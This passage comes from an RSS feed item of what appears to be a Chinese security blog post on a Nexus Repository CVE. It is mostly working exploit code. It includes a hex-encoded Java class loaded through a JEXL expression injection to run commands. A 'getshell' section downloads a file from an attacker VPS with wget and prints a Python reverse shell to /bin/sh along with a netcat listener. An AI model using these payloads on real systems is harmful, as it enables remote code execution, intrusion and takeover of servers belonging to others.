0C0099009A0C009B009C0100246A6176612E6C616E672E5468726561644C6F63616C245468726561644C6F63616C4D617001002A6A6176612E6C616E672E5468726561644C6F63616C245468726561644C6F63616C4D617024456E74727901000576616C756507009D0C009E009F0C009B00A00C00A100A20C00A300A40100276F72672E65636C697073652E6A657474792E7365727665722E48747470436F6E6E656374696F6E0C00A500A601000E676574487474704368616E6E656C01000F6A6176612F6C616E672F436C6173730C00A700A80100106A6176612F6C616E672F4F626A6563740700A90C00AA00AB01000B676574526573706F6E73650100096765745772697465720100136A6176612F696F2F5072696E745772697465720C00AC002F0C00AD002801000F4578706C6F69742F546573743233340100136A6176612F6C616E672F457863657074696F6E0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000777616974466F7201000328294901000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B0100136A6176612F696F2F496E70757453747265616D010009617661696C61626C6501000472656164010007285B4249492949010005285B4229560100106A6176612F6C616E672F54687265616401000D63757272656E7454687265616401001428294C6A6176612F6C616E672F5468726561643B010007666F724E616D65010025284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F436C6173733B0100106765744465636C617265644669656C6401002D284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F7265666C6563742F4669656C643B0100176A6176612F6C616E672F7265666C6563742F4669656C6401000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100176A6176612F6C616E672F7265666C6563742F41727261790100096765744C656E677468010015284C6A6176612F6C616E672F4F626A6563743B2949010027284C6A6176612F6C616E672F4F626A6563743B49294C6A6176612F6C616E672F4F626A6563743B010008676574436C61737301001328294C6A6176612F6C616E672F436C6173733B0100076765744E616D6501001428294C6A6176612F6C616E672F537472696E673B010006657175616C73010015284C6A6176612F6C616E672F4F626A6563743B295A0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100057772697465010005636C6F736500210026001F000000000002000100270028000100290000002F00010001000000052AB70001B100000002002A00000006000100000009002B0000000C000100000005002C002D00000009002E002F0002002900000304000400140000013EB800022AB600034C2BB60004572BB600054D2CB60006BC084E2C2D032CB60006B6000757BB0008592DB700093A04B8000A3A05120B57120CB8000D120EB6000F3A06190604B6001019061905B600113A07120B571212B8000D3A0819081213B6000F3A09190904B6001019091907B600113A0A120B571214B8000D3A0B190B1215B6000F3A0C190C04B60010013A0D03360E150E190AB80016A2003E190A150EB800173A0F190FC70006A70027190C190FB600113A0D190DC70006A70016190DB60018B60019121AB6001B990006A70009840E01A7FFBE190DB600183A0E190E121C03BD001DB6001E190D03BD001FB600203A0F190FB600183A101910122103BD001DB6001E190F03BD001FB600203A111911B600183A121912122203BD001DB6001E191103BD001FB60020C000233A1319131904B600241913B60025B100000003002A0000009600250000001600080017000D0018001200190019001A0024001B002E001D0033001F004200200048002100510023005B002500640026006A002700730029007D002A0086002B008C002D008F002F009C003100A5003200AA003300AD003500B6003600BB003700BE003900CE003A00D1002F00D7003D00DE003E00F4003F00FB004001110041011800420131004401380045013D0049002B000000DE001600A5002C00300031000F0092004500320033000E0000013E003400350000000801360036003700010012012C00380039000200190125003A003B0003002E0110003C003500040033010B003D003E0005004200FC003F00400006005100ED004100310007005B00E3004200430008006400DA004400400009007300CB00450031000A007D00C100460043000B008600B800470040000C008F00AF00480031000D00DE006000490043000E00F4004A004A0031000F00FB0043004B004300100111002D004C0031001101180026004D004300120131000D004E004F00130050000000340005005B00E3004200510008007D00C100460051000B00DE006000490051000E00FB0043004B0051001001180026004D005100120052000000040001005300010054000000020055';   y=0;   z='';   while (y lt x.length()){       z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0];       y += 2;   };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;defineClass.setAccessible(true);&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;x=defineClass.invoke(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;    y,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;   'Exploit.Test234',&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;    z.getBytes('latin1'),    0,&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;    3054&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;);x.getMethod('test', ''.class).invoke(null, 'ifconfig');'done!'}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;, &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;property&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;value&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;jexl&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;limit&quot;&lt;/span&gt;: 50, &lt;span class=&quot;s2&quot;&gt;&quot;page&quot;&lt;/span&gt;: 1&lt;span class=&quot;o&quot;&gt;}]&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;previewAssets&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;getshell:&lt;/p&gt;
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;下载反弹文件&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;wget http://vps_to_your_py:8000/nc.py&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;---&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;py&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;vps_ip&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fileno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/bin/sh&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;-i&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-
-&lt;span class=&quot;o&quot;&gt;----&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;your&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;vps&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;terminal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;nc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lvnp&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18080&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;Listening&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1111&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;python nc.py&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;即可。&lt;/p&gt;
-</description>
-        <pubDate>Sun, 23 Aug 2020 00:00:00 +0800</pubDate>
-        <link> https://www.sentrylab.cn/blog/2020/Nexus/vuln-Cve/</link>
-        <guid isPermaLink="true">/blog/2020/Nexus/vuln-Cve/</guid>
-        
-        
-        <category>blog</category>
-        
-        <category>笔记</category>
-        
-        <category>src</category>
-        
-        <category>CVE</category>
-        
-        <category>信息搜集</category>
         
       </item>
     
